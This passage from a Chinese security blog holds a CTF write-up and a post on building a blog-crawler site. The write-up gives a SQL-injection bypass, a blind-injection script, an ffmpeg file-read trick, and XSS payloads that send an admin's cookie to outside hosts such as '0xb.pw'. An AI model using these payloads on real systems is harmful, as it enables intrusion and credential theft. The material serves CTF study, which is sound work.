class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">($array)</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</div><div class="line">            !get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);</div><div class="line">            waf($value);</div><div class="line">            $array[$key]=$value;</div><div class="line">        &#125;   </div><div class="line">    &#125;   </div><div class="line">    <span class="keyword">return</span> $array;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>和第一个sql点的数据没有关系，所以不是二次注入，本来如果就只是转义处理的话这个点就是安全的，但是它作死的在参数处理流程中加了一些东西。。。</p><ul><li>把经过转义后的参数中的单引号都去掉</li><li>对union select | select from 做了过滤</li><li>转义函数中没有对两层数组过滤，并且过滤函数中加了waf($value)</li></ul><p>最后一个没有发现利用方式<br>第二个过滤其实没有必要，因为参数长度限制在了11，所以也不会用这两种写法，而且想绕过也很简单，我们可以看到在waf函数中检测完后将’ ‘去掉了，所以<code>sel ect from  un ion select</code>就可以绕过，并且过滤结束后又变回正常语句<br>第一个过滤是本题关键所在，因为在转义过滤中会在’前面加上\，之后再把’去掉后就只剩下\了，我们来观察下sql语句：<br><code>select count(*) from t_info where username = &#39;$name&#39; or nickname = &#39;$name&#39;</code><br>name参数如果最后一个字符是’的话，过滤后最后一个字符就变成了\,所以就把后一个单引号转义掉了，这样第一个单引号和第三个单引号成对，我们就实现了单引号闭合，在外面写东西了，通过or 1’就可以满足登陆需求了，但还有个问题是，在语句最后会有一个\’影响执行，就考虑怎么去掉他，我们来看前后两个name的环境，一个是在’’里面，另一个是作为功能性语句出现，所以我们写成or 1#’并不会导致在第一个name处出现问题，于是就能拿到flag了。<br><img src="http://i.imgur.com/ep2qmez.png" alt=""></p><h2 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h2><p>扫描后没有发现源码泄露，然后在注册点的phone参数上发现了注入点，输入’会有报错产生，结合环境是insert语句来看应该是报错注入，正好前几天看到了Ben师傅的一个报错注入的利用，测试后诸如<code>&#39; or if(substring(( {payload} ),{},1)=binary(&#39;{}&#39;),0,1) and ST_LatFromGeoHash(version()) or &#39;</code>语句可以利用，但关键是我卡死在了waf上！！！哎，还是太菜，<code>/*!*/</code>的绕过方式明明以前用过好多次，但比赛的时候就是没有想到，在简单尝试了几种绕过方式后，思路竟然转向了如何不利用from来拿数据上，结果就进了死胡同，正好这几天打算把sql盲注总结下，把思路都总结下来，省得注入的时候漏掉什么。<br>哎，接下来就是看的其他师傅的思路了，这里盲注可以利用，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">s = requests.session()</div><div class="line">url = <span class="string">"http://120.132.54.253/index.php?a=doregister"</span></div><div class="line">data = &#123;<span class="string">"username"</span>:<span class="string">"1"</span>,<span class="string">"phone"</span>:<span class="string">""</span>,<span class="string">"password"</span>:<span class="string">"1"</span>,<span class="string">"repassword"</span>:<span class="string">"1"</span>&#125;</div><div class="line">payload = <span class="string">""</span> <span class="comment">#此处填写payload</span></div><div class="line"></div><div class="line">answer = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</div><div class="line">        temp = chr(i)</div><div class="line">        data[<span class="string">'phone'</span>] = <span class="string">"' or if(substring((&#123;&#125;),&#123;&#125;,1)=binary('&#123;&#125;'),0,1) and ST_LatFromGeoHash(version()) or '"</span>.format(payload,<span class="string">'-'</span>+str(j),temp)</div><div class="line">        retu = s.post(url=url, data=data).content</div><div class="line">        <span class="keyword">if</span> retu == <span class="string">'success'</span>:</div><div class="line">            answer += temp</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> answer[::<span class="number">-1</span>]</div></pre></td></tr></table></figure></p><p>从config表中拿到用户名和密码，之后登陆进去，是一个上传.avi文件然后转成.md4的地方，然后表哥们都很快想到是ffmpeg任意文件读取漏洞，然而我并没有听说过，下面贴出来地址，同样不清楚ffmpeg任意文件读取漏洞的小伙伴们也来了解下吧<br><a href="http://blog.cyberpeace.cn/FFmpeg/" title="http://blog.cyberpeace.cn/FFmpeg/" target="_blank" rel="external">http://blog.cyberpeace.cn/FFmpeg/</a></p><p>除此之外，目录读取过程中个，还存在过滤，应该就是匹配过滤，绕过也很简单，通过跨目录来绕过`file:///etc/init.d/../passwd 3.avi</p><p>个人而言还要记录下任意文件读取漏洞下获取flag的思路，表哥们首先读取了/etc/passwd文件拿到所有用户名列表后去对应的host目录下去拿flag，在这点上我的思路还是不够开阔。</p><h2 id="Guest-Book"><a href="#Guest-Book" class="headerlink" title="Guest Book"></a>Guest Book</h2><p>一道xss题目，测试一番后情况如下：</p><h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">CSP:</div><div class="line">default-src 'self';</div><div class="line">script-src 'self' 'unsafe-inline' 'unsafe-eval';  </div><div class="line">font-src 'self' fonts.gstatic.com;  </div><div class="line">style-src 'self' 'unsafe-inline';  </div><div class="line">img-src 'self'</div><div class="line"></div><div class="line">sandbox:</div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="comment">//sandbox</span></div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Function;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.eval;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.alert;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.XMLHttpRequest;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Proxy;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.Image;</div><div class="line"><span class="keyword">delete</span> <span class="built_in">window</span>.postMessage;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line">后台数据过滤：</div><div class="line">一些标签如<span class="tag">&lt;<span class="name">link</span>&gt;</span>，一些DOM属性如location等被替换为了hacker</div></pre></td></tr></table></figure><p>参数注入点：</p><ul><li>一个在主页中提交，将由管理员触发，触发页面是个html文件，<br><code>http://106.75.119.64:8888/uploads/2017-07-10-05-08-29-8cY7kyvOpoND.html</code>像这样会每次变化</li><li>还有一个重命名的xss点，回显处在主页上</li></ul><h3 id="题目拿取flag思路"><a href="#题目拿取flag思路" class="headerlink" title="题目拿取flag思路"></a>题目拿取flag思路</h3><p>这道题目的flag存放在cookie中，尝试了读取触发页面，以及触发页面的cookie都没有有效数据，然后也没有明确的提示信息说只有admin可以进行访问，之后就可以考虑flag存放在子目录的cookie的情况了，我们尝试读取触发页面的document.referer可以看到触发点是<code>http://106.75.119.64:8888/admin/review.php</code>，然后再xss接收中可以看到访问请求的来源是<code>http://106.75.119.64:8888/uploads/2017-07-10-05-08-29-8cY7kyvOpoND.html</code>，所以bot的机制应该是首先访问review.php，然后被重定向到写有我们js代码的html文件，两个文件并不在同一个目录，所以我们要做的就是去访问/admin目录下的文件，然后读取cookie</p><h3 id="综合自己发现的以及表哥们的绕过思路做个统计："><a href="#综合自己发现的以及表哥们的绕过思路做个统计：" class="headerlink" title="综合自己发现的以及表哥们的绕过思路做个统计："></a>综合自己发现的以及表哥们的绕过思路做个统计：</h3><p><strong>对后台数据过滤的绕过</strong></p><ol><li>可以使用window[‘loca’+’tion’].href这种写法来绕过检测</li><li>可以使用eval来绕过使用检测 eval(‘loca’+’tion’).href</li><li>对于标签可以改为js动态建立来进行绕过</li><li>因为csp允许了unsafe-eval</li></ol><p><strong>对沙盒的绕过</strong></p><ol><li>可以建立一个iframe就可以避免沙盒的函数禁用了</li><li>index.php是不存在沙盒的，而且存在xss的重命名触发点，所以将admin进行重命名，之后定位到index.php执行基于名字的js代码就可以</li></ol><h3 id="收集并分析做题的思路"><a href="#收集并分析做题的思路" class="headerlink" title="收集并分析做题的思路"></a>收集并分析做题的思路</h3><p><strong>From Ben师傅</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:</span></span></div><div class="line">i=document.createElement('iframe');</div><div class="line">i.src='/admin/review.php?b=2e232 e23';</div><div class="line">i['onlo'+'ad']=function()&#123;</div><div class="line">parent.window['locat'+'ion'].href='http://xss/'+escape(this.contentWindow.document.cookie)&#125;; document.body.append(i)"&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure></p><p>分析：</p><p>使用src标签的javascript伪协议来书写js代码，<br>使用js代码动态构建一个iframe来获得内容，这样就可以不绕过对xhr的禁用<br>之后对父窗口进行重定向到xss平台来实现数据传送</p><p><strong>From Lorexxar</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"re"</span> <span class="attr">action</span>=<span class="string">"../rename.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"nname"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;eval(String.fromCharCode(118, 97, 114, 32, 105, 102, 114, 97, 109, 101, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 105, 102, 114, 97, 109, 101, 34, 41, 59, 10, 105, 102, 114, 97, 109, 101, 46, 115, 114, 99, 32, 61, 32, 34, 46, 47, 97, 100, 109, 105, 110, 47, 34, 59, 10, 105, 102, 114, 97, 109, 101, 46, 105, 100, 32, 61, 32, 34, 102, 114, 97, 109, 101, 34, 59, 10, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 105, 102, 114, 97, 109, 101, 41, 59, 10, 10, 105, 102, 114, 97, 109, 101, 46, 111, 110, 108, 111, 97, 100, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 123, 10, 32, 32, 9, 118, 97, 114, 32, 99, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 40, 39, 102, 114, 97, 109, 101, 39, 41, 46, 99, 111, 110, 116, 101, 110, 116, 87, 105, 110, 100, 111, 119, 46, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 10, 10, 9, 118, 97, 114, 32, 110, 48, 116, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 108, 105, 110, 107, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 114, 101, 108, 34, 44, 32, 34, 112, 114, 101, 102, 101, 116, 99, 104, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 104, 114, 101, 102, 34, 44, 32, 34, 47, 47, 48, 120, 98, 46, 112, 119, 47, 63, 34, 32, 43, 32, 99, 41, 59, 10, 9, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 110, 48, 116, 41, 59, 10, 125))&lt;/script&gt;"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">'re'</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line">那一长串数值转换后为：</div><div class="line">var iframe = document.createElement("iframe");</div><div class="line">iframe.src = "./admin/";</div><div class="line">iframe.id = "frame";</div><div class="line">document.body.appendChild(iframe);</div><div class="line"></div><div class="line">iframe.onload = function ()&#123;</div><div class="line">  var c = document.getElementById('frame').contentWindow.document.cookie;</div><div class="line"></div><div class="line">var n0t = document.createElement("link");</div><div class="line">n0t.setAttribute("rel", "prefetch");</div><div class="line">n0t.setAttribute("href", "//0xb.pw/?" + c);</div><div class="line">document.head.appendChild(n0t);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>分析：<br>首先使用表单提交的方式来进行发出POST请求进行重命名操作，绕过对xhr的禁用<br>命名之后会自动跳转回index.php，触发rename处的xss点<br>建立iframe标签拿到对应页面的详细数据<br>在iframe的onload上编写事件，通过建立link标签来将数据传递到xss面板<br>之所以要利用rename这里的xss点就是因为这里没有sandbox，没禁用eval就可以使用eval(‘loca’+’tion’)这种写法了</p><h2 id="flag-vending-machine"><a href="#flag-vending-machine" class="headerlink" title="flag vending machine"></a>flag vending machine</h2><p>一道二次注入的题目，在用户注册那里使用的转义型过滤，然后扣除钱的时候根据用户的username来扣钱，所以在扣钱的这里就形成了二次注入，然后就可以通过是否买东西后会扣除相应的钱来做布尔型盲注。<br>比赛的时候一直在考虑条件竞争，尽管前几天刚刚学了二次注入，还是没有想到，所以最后也没有做出来，payload就不贴了，有兴趣的可以去看看Lo师傅的payload，因为听说还有一些简单的过滤啥的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛好不人性啊，连着24小时，还半夜放题，感觉结束后快猝死了2333。看着其它队伍的表哥嗖嗖的日题也只有喊666的份了，当然对于我这种小白来说重点还是在于赛后的总结学习，嘛，开始吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个博客爬取网站的设计思路与流程</title>
    <link href="https://someonesometimes.github.io/2017/06/29/%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%B5%81%E7%A8%8B/"/>
    <id>https://someonesometimes.github.io/2017/06/29/一个博客爬取网站的设计思路与流程/</id>
    <published>2017-06-29T12:39:52.000Z</published>
    <updated>2017-10-01T16:43:37.014Z</updated>
    
    <content type="html"><![CDATA[<p>前后花了两个月的时间，终于把数据库课设做完了。。。考虑到wooyun关闭后各种wooyun资源dump的流行，加上正好最近在通过各个博客学习安全知识，就想着做一个博客爬取网站吧，首先是写出一个爬虫来爬取整个博客的文章，然后再展示出来。</p><p><img src="http://i.imgur.com/qNswEah.png" alt=""></p><p><img src="http://i.imgur.com/r2IDn4k.png" alt=""><br>这是网站的登陆界面，在左侧的文字概述了我做整个网站的初衷，希望做一个blog的收集平台，能够方便的爬取博客，然后展示这些dump下来的文章，以备wooyun那样的不测2333<br>对了，细心的同学应该能够发现，这个页面使用的是github的css文件</p><p>本篇文章我将从以下几方面对开发过程进行描述：</p><ul><li>爬虫的编写<ul><li>爬取逻辑</li><li>解析html以获取页面样式</li><li>入口参数检测以提高爬虫健壮性</li></ul></li><li>后端逻辑的实现<ul><li>php后台处理的实现</li><li>轮询来获取后台程序的运行进度</li><li>后台文件结构与设计</li></ul></li><li>网站安全性的考虑</li><li>样式设计（这方面我第一次接触，非常菜没什么好借鉴的。。。）</li><li>其他的一些问题<ul><li>整个网站的编码</li><li>页面标签事件触发后传this</li><li>使用中文智能分词实现模糊搜索</li></ul></li></ul><a id="more"></a><hr><h2 id="爬虫的编写"><a href="#爬虫的编写" class="headerlink" title="爬虫的编写"></a>爬虫的编写</h2><h3 id="首先是爬取逻辑"><a href="#首先是爬取逻辑" class="headerlink" title="首先是爬取逻辑"></a>首先是爬取逻辑</h3><p>我采用的是正则表达式匹配的方式，逻辑是这样的：维护一个目录列表，把博客初始链接放进去作为列表第一个成员，之后对目录列表进行遍历，解析链接中所有符合目录正则表达式的新的目录 url，并将新的目录 url增加到目录列表中，这样在循环结束后，就相当于把所有的目录页面都走了一遍。<br>同时在这个过程中，我们对每个链接的html文件可不只是扫描出符合目录正则表达式的链接，我们同时还会通过article正则表达式扫描出所有文章链接，并添加到文章列表。所以在对目录列表的整个遍历结束之后，我们不仅仅是遍历解析了所有的page页面，还获得了网站中所有的文章链接</p><h3 id="然后是对单个页面的样式，js代码，图片等的解析下载"><a href="#然后是对单个页面的样式，js代码，图片等的解析下载" class="headerlink" title="然后是对单个页面的样式，js代码，图片等的解析下载"></a>然后是对单个页面的样式，js代码，图片等的解析下载</h3><p>拿到所有的文章链接后，就是对文章的解析下载了，但是使用python下载链接只能拿到html文件，不包括css文件，js文件，图片这些其他的资源，如果想在本地离线使用的话，就需要解析下载下来，这里我首先使用python的BeautifulSoup模块对html进行了解析，使HTML文件变成可以操作的DOM形式。<br>之后我找了几个常见的博客文章样本进行分析，可以看到基本上需要下载的链接在<code>&lt;link&gt; &lt;img&gt; &lt;script&gt;</code>这几个标签的属性中，于是我就把这些标签都拿出来，从他们的属性中抓取要下载的链接，之后下载下来放到本地就可以了，具体抓那些属性，我都放到了配置文件中，可以随时修改抓取策略<br>通过上面的这种方式，抓取下来的页面基本能够还原原来网页的各种效果</p><h3 id="关于提高爬虫的健壮性"><a href="#关于提高爬虫的健壮性" class="headerlink" title="关于提高爬虫的健壮性"></a>关于提高爬虫的健壮性</h3><p>首先要确定由用户指定的对象，也就是程序输入点</p><ul><li>爬取的链接可能无法访问</li><li>用户提供的路径可能不存在或没有权限读写</li></ul><p>除此之外还会存在问题的对象</p><ul><li>本地存放是基于windows文件系统的，在命名上会有要求，在写完整个爬虫后，我最终正则表达式需要去过滤的字符有这些：[\/:*?\”&lt;&gt;|\x20\n\t\r\f\a]</li><li>在爬取中涉及到对html文件解析之后再下载，这些从页面中解析出来的链接可能存在问题</li></ul><p>还有一个之前没太注意过的问题：<br>因为爬取中需要对各种书写方式做出解析，所以用到了很多切片，分割等操作，就可能会存在溢出问题，比如说我想去掉<code>http://</code>，用str[7:]实现，在遇到不是<code>http://</code>格式的时候就会出现溢出问题。这些错误在进行各种程序输入统筹标准化的时候经常出现</p><p>在进行参数检测的时候，需要遵循的原则如下：</p><ul><li>尽量在参数入口进行检测，这样以后用的时候就不用再检测了</li><li>要仔细分析那些是来源不可靠的参数，尽量在他们出现的时候就进行参数检测</li></ul><hr><h2 id="后端逻辑的实现"><a href="#后端逻辑的实现" class="headerlink" title="后端逻辑的实现"></a>后端逻辑的实现</h2><h3 id="php后台处理的实现"><a href="#php后台处理的实现" class="headerlink" title="php后台处理的实现"></a>php后台处理的实现</h3><p>php调用爬虫的方式采用命令行的形式，在php中使用shell_exec()函数来对python爬虫进行调用，但是php程序不可能等待爬虫运行结束，处理的逻辑应该是：在爬虫开始前断开http链接，之后让爬虫自己去运行。具体的实现分析我在<a href="http://cauc.me/2017/06/20/php%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E4%B8%8Ehttp%E7%9A%84%E8%81%94%E7%B3%BB/" target="_blank" rel="external">php输出缓冲与http的联系</a>中已经做出了详细解释</p><h3 id="轮询读取后台程序进度"><a href="#轮询读取后台程序进度" class="headerlink" title="轮询读取后台程序进度"></a>轮询读取后台程序进度</h3><p>后台的程序在断开http链接之后就无法返回给前端任何信息了，这时用户对后台运行的程序无法掌控，对于这种情况，常见的解决方案是轮询或websocket，websocket一般在软件中使用，网站中经常使用轮询的方式。<br>所谓轮询，就是后台的程序把运行的实时进度都写到数据库中，然后在前端使用ajax来不断的去拿取数据库的信息来实现对后台运行程序的实时掌控，因为前端要不断的发起访问请求，所以叫轮询</p><p>为了减轻带宽与机子压力而采取的措施：</p><ul><li>在js获取更新资源的api函数中，将传输的更新资源在数据库中使用mysqli_fetch_row()获取而不使用mysqli_fetch_arrow()，这两个取出的结果，一个是列表格式，一个是字典格式的，自然列表格式的要更小</li><li>js获取更新资源后，在没有打开进度详情页面的时候，只更新主页面的通知图标，在打开进度详情页面的时候再对详情页面进行实时更新。可以避免对js对页面大量不必要的重写</li></ul><p>可能的更新：<br>关于cgi，fast-cgi这些关于php数据传输方式的名词<br>redist是个后台处理队列的扩展，可能经常在后台大规模计算的时候使用</p><h3 id="php后台文件结构与设计"><a href="#php后台文件结构与设计" class="headerlink" title="php后台文件结构与设计"></a>php后台文件结构与设计</h3><p><strong>因为是第一次写网站，参考火日的xss平台的文件目录，把网站的文件结构设计如下：</strong></p><ul><li>首先是存放静态文件的static文件夹，里面分为css，js，images，font四个文件夹，所有的引用都来自它们</li><li>两个php扩展文件，也放在同级目录下，在调用的时候直接require到对应的路径</li><li>将所有允许直接访问的php文件放到外层目录下</li><li>所有提供辅助功能，也就是让外层php调用的php文件，放到内层目录下，像config.php,function.php,sql.php,auth.php等,这些辅助文件有些像functioin.php，sql.php这样提供各种需要的函数，有些像auth.php,waf.php这样提供一段必要的执行代码</li></ul><p><strong>对于js发出请求的相响应设计</strong><br>这些响应逻辑都在api.php页面中实现，以api接口的形式实现，不做登陆检测，同时为了保证有些api的管理员才能调用特性，需要建立admin_api.php,做管理员登陆检测。<br>基本的api.php书写结构如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>( $_GET[<span class="string">'cmd'</span>]) &amp;&amp; $_GET[<span class="string">'cmd'</span>] != <span class="string">""</span> )&#123;</div><div class="line">    <span class="keyword">switch</span>( $_GET[<span class="string">'cmd'</span>] )&#123;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deleteblog'</span>:</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>)&#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deletecrawlerstate'</span>:</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>) &#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        <span class="keyword">case</span> <span class="string">'deletecrawler'</span>:</div><div class="line"></div><div class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'blog'</span>]) &amp;&amp; $_GET[<span class="string">'blog'</span>] != <span class="string">""</span>) &#123;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>除此之外，这些页面返回的数据建议使用json格式，也就是<code>echo(json_encode(变量))</code>，并且在程序开头指明<code>header(&#39;Content-Type: application/json&#39;);</code><br>这样在js接收中$.get(url,function(data, textstates, fn){ })中，data就是可以直接使用的变量格式<br>对了，要注意json只能接受utf编码格式的变量，如果php使用gb2312编码的话，需要转化为utf编码的</p><p><strong>访问控制如下设计:</strong><br>所有内层的辅助函数都禁止直接访问，这样实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IN_BLOG_PLATFORM'</span>))&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">如果是管理员页面需要调用的话，还需要加上</div><div class="line"><span class="keyword">if</span>(!defined(<span class="string">'IS_ADMIN'</span>))&#123;</div><div class="line">    <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">这样的话，在直接访问的时候，就会因为没有定义宏变量而禁止访问</div></pre></td></tr></table></figure></p><p>外层的函数在所有入口点需要进行session检查，将所有未登录的访问都重定向到login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">这个函数在页面入口除了检查了$_SESSION[<span class="string">'isLogin'</span>]外还检查了user_agent值</div><div class="line"><span class="keyword">if</span> (!( <span class="keyword">isset</span>($_SESSION[<span class="string">'isLogin'</span>]) &amp;&amp; $_SESSION[<span class="string">'isLogin'</span>] === <span class="keyword">true</span> &amp;&amp;</div><div class="line">    <span class="keyword">isset</span>($_SESSION[<span class="string">'user_agent'</span>]) &amp;&amp; $_SESSION[<span class="string">'user_agent'</span>] === $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] ))&#123;</div><div class="line"></div><div class="line">    $_SESSION[<span class="string">'isLogin'</span>] = <span class="keyword">false</span>;</div><div class="line">    $_SESSION[<span class="string">'user_IP'</span>] = <span class="string">""</span>;</div><div class="line">    $_SESSION[<span class="string">'user_agent'</span>] = <span class="string">""</span>;</div><div class="line">    <span class="comment">//清空session会话，清除session变量，结束session会话</span></div><div class="line">    session_unset();</div><div class="line">    session_destroy();</div><div class="line">    header(<span class="string">"Location: login.php"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">管理员页面需要在入口进行管理员检查，我是这样设计的</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) &amp;&amp; $_SESSION[<span class="string">'username'</span>] != <span class="string">""</span>)&#123;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!checkAdmin($mysqli, $_SESSION[<span class="string">'username'</span>]))&#123;</div><div class="line">        <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>综上所述，一个页面做出完整的访问控制需要添加如下功能代码：</p><ul><li>定义相应的宏变量，以引入需要的辅助函数<br><code>define(&quot;IN_BLOG_PLATFORM&quot;, true);</code></li><li>引入需要的辅助函数<br><code>require_once (&quot;./libs/waf.php&quot;);</code></li><li>设置http_only并开启session<br><code>ini_set(&quot;session.cookie_httponly&quot;, 1); session_start();</code></li><li>基于session中的值进行个各种检查，像是否登陆，user-agent是否符合等，只有在检查通过的时候才允许访问页面</li><li>链接数据库</li></ul><p><strong>表单提交中token的作用分析</strong><br>之前一直没有注意到过，见到火日师傅的xss平台中使用了，自己也就在表单提交中加上了，所谓表单提交中的token，指的是在表单中隐藏一行input，其值是随机生成的，并存放到session中，然后随着表单数据提交到服务端，服务端会对token值与存储在session的值进行比对，只有在相同的情况下才会继续往下执行<br>一开始使用这项功能的时候没能体会到什么作用，现在多少能理解一点了</p><ul><li>填写表单，提交表单这个流程必须人为完整的走下来才行，如果想直接提交表单参数的话，会因为没有token而被拒绝，这应该能够把很多自动化爬虫，暴力破解都拒之门外。</li><li>我在设计login.php, 